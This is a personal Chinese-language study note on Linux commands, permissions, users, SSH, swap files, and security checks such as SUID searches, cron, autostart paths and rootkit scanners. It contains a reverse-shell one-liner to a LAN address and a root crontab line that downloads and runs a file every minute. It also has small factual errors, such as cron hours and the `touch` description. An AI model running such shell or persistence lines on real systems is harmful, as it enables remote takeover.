# Linux笔记

Linux是常用的服务器操作系统，安全免费稳定且占有率高。

除企业服务器外，不需要杀毒。

### Linux文件系统

Linux没有盘符概念，只有一个根目录，所有的文件都在根目录下。

>/
>
>根目录，**一般情况下只存放目录**。
>
>>/bin
>>
>>与/usr/bin相同，存放二进制文件，通常是终端指令。
>>
>>/sbin
>>
>>系统bin目录，通常存储系统维护相关命令
>>
>>/etc
>>
>>系统配置文件存放位置，不应放置可执行文件。重要的文件有
>>
>>>/etc/inittab
>>>
>>>/etc/fstab
>>>
>>>/etc/init.d
>>>
>>>/etc/X11
>>>
>>>/etc/sysconfig
>>>
>>>/etx/xinetd.d
>>
>>/boot
>>
>>放置启动时所需文件，比如内核/boot/vmlinuz，系统引导管理器/boot/grub
>>
>>/dev
>>
>>存放设备文件，访问文件等于访问设备，常用挂载光驱，mount /dev/cdrom /mnt
>>
>>/home
>>
>>表示系统的家目录，新增用户账号时，用户的家目录都在这个路径下。~表示自己家，~e表示e家。
>>
>>/lib
>>
>>/usr
>>
>>>/usr/bin
>>>
>>>存储用户后期安装的程序
>>>
>>>/usr/sbin
>>>
>>>超级用户存储后期安装的系统管理程序

### 文件用户权限

```shell
ls -l FileName
```

简写`ll`，显示格式： 权限 日期 文件名

```
-rw-r--r-- 1 root root 91 May  7 20:21 monitor_log.sh
```

第一位表示文件类型， -表示文件，d表示目录。后三位为一组，第一组表示自己权限，第二组表示组权限，第三组表示所有人权限。

rxw可以用数字来表示。r==4; w==2; x==1; 后跟数字是硬链接数，第一个root表示root用户，第二个root表示root组，后面是修改时间，最后是文件名

硬链接数表示选中这个文件或文件夹的方式有几个

### Linux发行版

linux发行版，也称为**GNU/Linux 发行版**，通常包含：办公桌面环境、办公套件、媒体播放器、数据库等。

常见的发行版如下

```
Ubuntu、Redhat、Fedora、openSUSE、Linux Mint、Debian、Manjaro、Mageia、CentOS、Arch
```

### 常用命令

`pwd`显示当前工作目录，

`touch`创建文件，如果文件不存在，则创建目录。如果文件存在，则修改日期。

`mkdir`创建目录，加入`-p`参数可以递归创建目录。

`grep`查找，支持字符串和正则。`-n`显示行号，`-v`反选，`-i`忽略大小写。

`ssh`远程链接`ssh -p port user@server`

`scp`远程复制`scp -P port 本地文件 user@server:path`

`which 命令`，可以查看当前命令的二进制文件存储位置

### ssh远程链接

ssh配置文件都在home/user目录下的 .ssh目录下，可以使用ssh-keygen生成密钥，使用ssh-copy-id -p port user@server向服务器传送公钥，其中，密钥自己保存，公钥由服务器保存。

对于常链接的设备，可以使用别名来配置：路径`~/.ssh/config`，内容

```
Host Name
	HostName ip
	User username
	Port 22
```

最后，只需要输入`ssh Name`即可链接

### 用户权限

`chmod`修改文件或目录的访问权限`chmod (+/-)rwx file/path`例子`chmod +rwx root`

##### 设置组

`groupadd name`添加组，`groupdel name`删除组，`cat /etc/group`查看组，`chgrp name path/file`修改文件目录所属组。这些指令**需要根权限**

##### 设置用户

`useradd -m -g 组名 用户名`，-m自动添加家目录，-g设置组，否则自动创建组

`passwd 密码 用户`用户只有被指定密码才可以登陆

`userdel -r 用户名`移除用户，-r代表删除家目录

`cat /etc/passwd|grep 用户名`，查看用户信息

这些指令**需要根权限**

##### 查看用户信息

`id 用户名`，查看用户的UID和GID

`who`查看当前所有登陆的用户列表

`whoami`查看当前登陆帐号

使用`id`命令查看的信息存储在/etc/passwd和/etc/group下，passwd下信息是通过冒号分组表示的

`Name:x:1002:1001::/home/Name:`对应的意义分别是`用户名:有密码且加密:用户UID:用户GID也称组ID:用户全名没有为空:家目录位置:登陆使用的ssh`

> 组信息：`Name:x:GID:USERS`

##### 设置用户所属组

主组，附加组：主组通常在建立用户时指定，附加组通常代表用户的附加权限

修改用户主组：`usermod -g 用户名`，修改用户附加组：`usermod -G 用户名`，修改用户使用的shell：`usermod -s shell路径`，默认`/bin/bash`

> 通常，修改组之后重新登陆生效

##### 设置shell

通常，新用户使用的是dash，标准用户使用的是bash。

`usermod -s /bin/bash 用户名`用来修改新用户使用的shell

`bash -i>&/dev/tep/192.168.101.11/9999 0>&1`指定一个远程连接到`netcat`的一个`bash`，0代表标准输入，1代表标准输出

##### su切换用户

`su - 用户名`可以切换到更高权限的用户，可以切换到root，如果不添加用户名，则保持工作目录不变且切换到root

`su`切换到root，不改变工作目录

`su r`切换到r，不改变工作目录

`su - r`切换到r，切换工作目录

##### 修改文件权限

`chown Name Path/File`修改拥有者

`chgrp -R Name Path/File`递归修改拥有组

`chmod -R 755 Path/File`递归修改文件权限

### 系统

`date`查看系统时间

`cal`查看当月日历`-y`查看当年

`df`查看磁盘存储信息，`-h`查看可以人性化的查看

`du`查看文件占用大小，`-h`人性化查看，会刷屏

`ps`查看进程情况，`ps aux`可以查看所有进程，`a`所有进程，`u`详细状态，`x`现实没有控制台的进程

`top`检测进程信息，会阻塞控制台

`kill`结束进程代号（PID)，`-9`表示强制结束

`find`查找文件，`find Path -name "FileName"`查找指定的文件

`ln`创建文件链接，`ln -s File Link`创建普通链接，`ln File Link`创建硬链接，推荐使用决对路径

### tar包的打包与压缩

`tar -cvf Name.tar Path/File`打包一个文件，`c`表示创建，`v`表示显示过程，`f`指定名称

`tar -xvf Name.tar`解包文件，`-C`可以指定解压路径

`gzip`才可以**压缩**文件，**tar不能压缩**文件，使用`gzip`打包的文件后缀是`.tar.gz`，在`tar`命令中，使用`-z`选项进行压缩和解压

`bzip2`也可以压缩和解压，在`tar`中调用参数是`-j`，后缀是`.tar.bz2`

### 交换分区

交换分区用于存储内存中使用频率较小的文件，通常使用量比例小，但对于图形界面系统来说，是需要拥有的分区。通常，大小在4G-8G之间。

本章内容是关闭默认分区以及创建交换文件作为交换分区，以实现硬盘利用最大化。

`sudo swapoff /dev/xxx`关闭交换分区，`xxx`代表需要关闭的交换分区

`swapon -s`检测开启的交换分区，如果没有输出任何内容（不包括换行符），则代表没有交换分区或分区关闭成功。

`sudo dd if=/dev/zero of=/swapfile bs=1M count=交换文件大小(单位M) status=progress`使用dd刻录交换文件。

`sudo chmod 600 /swapfile`调整权限，防止内存泄漏。

`sudo mkswap /swapfile`设置为交换文件（现在才是真正的交换文件）。

`sudo swapon /swapfile`临时开启交换文件。

`swapon -s`如果没有任何问题，即可看到输出。

`sudo nano /etc/fstab`注释掉原来的交换分区，写入新的交换文件挂载信息。

```shell
# dev/nvme0n1p4 none swap defaults 0 0
/swapfile none swap defaults 0 0
```

通常看起来像以上这样调整即可，如果没有交换分区可以直接写入第二行。

### 权限与安全

#### Linux权限

读权限： r-4

写权限： w-2

执行权限： x-1

suid-4  程序设置suid时，任意用户执行程序，都以文件主权限运行。

sgid-2  程序设置sgid时，任意用户自行程序，都以拥有该文件的用户的组的权限运行。

sbit/t-1  当目录设置t权限后，在目录下的文件或子目录都仅允许root和拥有用户删除。

应用实例： 

```shell
chmod 4755 file
```

这将创建一个suid-4权限且为755权限的文件

```shell
find / -perm /4000 2>/dev/null
```

这将查询所有具有suid-4权限的文件，2为将失败信息输出到“黑洞”

#### 计划任务/定时任务

文件位置：

* /etc/crontab
* /var/spool/cron/
* /var/spool/cron/crontabs/

文件格式：

```shell
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
# 以上部分系统自动给出

# 文件格式
# .-----------------分钟（0-59）
# |  .--------------小时u（0-12）
# |  |  .-----------天（1-31）
# |  |  |  .--------月（1-12）
# |  |  |  |  .-----星期（0-6）
# |  |  |  |  |     
# *  *  *  *  *  user-name command

* * * * * root wget someurl && ./someurl &
```

#### 自启动

文件位置： 

* /etc/rc.d/init.d/
* /etc/rc[0-6].d/
* /etc/rc.local

#### 任意用户可写

* /tmp/
* /var/tmp/
* /dev/shm/
* dev/mqueue

查找命令 `find / -perm 1777`或`find / -perm 777 -type d`

#### 后门检测

可以使用`strings`命令进行元数据检测。

可以使用以下站点： [360威胁情报中心](https://ti.360.cn)、[微步在线](https://x.threatbook.cn)

#### 病毒扫描

主要依赖第三方

* chkrootkit
* rkhunter
* Gscan.py